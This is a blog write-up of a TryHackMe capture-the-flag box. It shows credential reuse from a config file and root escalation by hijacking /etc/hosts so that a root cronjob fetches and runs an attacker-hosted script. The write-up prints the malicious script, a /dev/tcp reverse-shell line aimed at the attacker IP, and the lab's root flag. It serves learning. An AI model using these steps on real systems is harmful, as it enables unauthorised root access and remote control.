Motivation was still high to try and tackle another CTF recently. I chose another popular easy box on TryHackMe, even though, once again, it took me like half a day to fully solve the box. The silver lining was that I got relatively far before having to consult a write-up. Even still, I learned a ton of new skills and techniques that I had not practiced in any other challenges so far!

## Pivoting to First User

After fully upgrading my shell, I started the enumeration process and found the file `/var/www/html/app/castle/application/config/database.php` containing a password for the user `toad`:

```php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

Using these credentials, I could pivot to the next user:

```console
www-data@mkingdom:/var/www/html/app/castle/application$ su toad
Password: 
toad@mkingdom:/var/www/html/app/castle/application$ 
```

I did some more enumeration in the backend of the web-server and found a suspicious script called `counter.sh` in `/var/www/html/app/castle/application`, but since this was root-owned, I couldn't execute it. The script itself didn't look too interesting either, and looked more like it was part of a cronjob (major foreshadowing...):

```console
#!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
```

Manual attempts (`sudo -l`, checking cronjobs, more enumeration, etc.) didn't get me very far, so I downloaded LinPEAS from a local http-server on my Kali and ran the script. ## Escalating to Root

Now for the more difficult part of the challenge: escalating privileges to root. Using the password for `mario`, I could see that `mario`could run the binary `id` with `sudo`:

```console
mario@mkingdom:~$ sudo -l
[sudo] password for mario:             
Matching Defaults entries for mario on mkingdom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, pwfeedback

User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

Unfortunately, this turned out to be a red herring, and I could neither find exploits on GTFOBins nor anywhere else on the Internet. I downloaded `pspy64` from my local Kali machine (not `pspy32`, since the command `uname -a` told me that the victim machine was running on a 64-bit architecture), and ran it:

Pspy64 reveals a cronjob that runs once per minute:

```console
2026/07/12 10:49:01 CMD: UID=0     PID=2496   | bash 
2026/07/12 10:49:01 CMD: UID=0     PID=2495   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2026/07/12 10:49:01 CMD: UID=0     PID=2494   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2026/07/12 10:49:01 CMD: UID=0     PID=2493   | CRON 
```

This is exactly the `counter.sh` script from earlier, but now we see that the output is written to the logfile `/var/log/log.up` as well, so I knew we had to do *something* with this information. This is where I got stuck, though, and had to confide in a write-up.

The hint is to notice that group of the `/etc/hosts` file is set to `mario`, and not `root`, as is usually the case. This meant I could perform a **local DNS poisoning** attack, i.e. we change an IP-address in `/etc/hosts` to point to our Kali machine instead of the actual web-server!

The file `/etc/hosts` contained the host `mkingdom:85` from which the `counter.sh` script is fetched and piped into bash. So all I had to do is change the IP-address from 127.0.0.1 to my attacker machine's IP:

```console
mario@mkingdom:/var/www/html/app/castle/application$ nano /etc/hosts
mario@mkingdom:/var/www/html/app/castle/application$ cat /etc/hosts
127.0.0.1       localhost
192.168.162.43  mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Next, I emulated the directory structure `/app/castle/application` of the web-app locally on my Kali, since the cronjob expects `counter.sh` to lie in a precise sub-folder of the web-root directory. Moreover, I created a malicious `counter.sh` locally in this subdirectory, containing:

```console
#!/bin/bash
echo "$(cp /root/root.txt /tmp)" 
```

I could have put a reverse shell in there, using `echo "$(sh -i >& /dev/tcp/192.168.162.43/9002 0>&1)"` instead, but I just wanted to try the same copy-to-`/tmp`-trick again. I spun up the malicious web-server (on port 85, which was of course important) on my Kali from which the victim machine would then curl the malicious counter.sh due to DNS poisoning: 

```console
┌──(kali㉿kali)-[~/Projects/mkingdom]
└─$ sudo python3 -m http.server 85   
```

After some time, I could see in the output of my malicious web-server that the cronjob had curled the malicious script and ran it, thus copying the root flag to `/tmp` and allowing us to read it:

```console
mario@mkingdom:/var/www/html/app/castle/application$ cat /tmp/root.txt 
thm{e8b2f52d88b9930503cc16ef48775df0}
```


## Lessons Learned

1. Basic functionality of local DNS poisoning. You basically trick the server into grabbing something off of a malicious server, since it blindly trusts the `/etc/hosts` file.
2. Instead of copying the flags to `/tmp`, I could have used `tac` instead of `cat`, which also reads all lines from a file, just in reversed order.
3. Instead of using `tac`, we could have looked for other instances of the `cat` binary, using `find / -type f -name cat 2>/dev/null`, to reveal the binary `/usr/lib/klibc/bin/cat`, with which we could have viewed the user-flag.
4. LinPEAS and PsPy are immensely powerful tools that I should always fall back to, if I don't find an attack surface manually.
5. Taking time to enmerate file systems is almost certainly worth it. Otherwise, I may not have found toad's credentials so easily.
